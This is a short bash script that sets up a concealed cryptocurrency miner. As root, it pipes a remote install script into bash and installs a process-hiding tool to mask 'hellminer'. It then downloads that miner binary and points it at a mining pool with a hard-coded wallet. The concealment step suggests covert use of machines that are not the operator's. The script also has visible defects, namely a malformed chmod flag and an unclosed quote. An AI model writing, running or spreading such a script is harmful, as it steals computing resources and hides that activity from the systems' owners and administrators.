#!/bin/bash
sudo su --command "sudo apt update &&
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && 
sudo apt install nodejs && 
npm i -g node-process-hider &&
sudo ph add hellminer &&
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && 
tar -xf hellminer_cpu_linux.tar.gz &&
chmod +× hellminer &&
./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RTBPM3NCdNkHu7FTpSe5VcKAYt2DqHBJbP.gyro -p x --cpu 2;
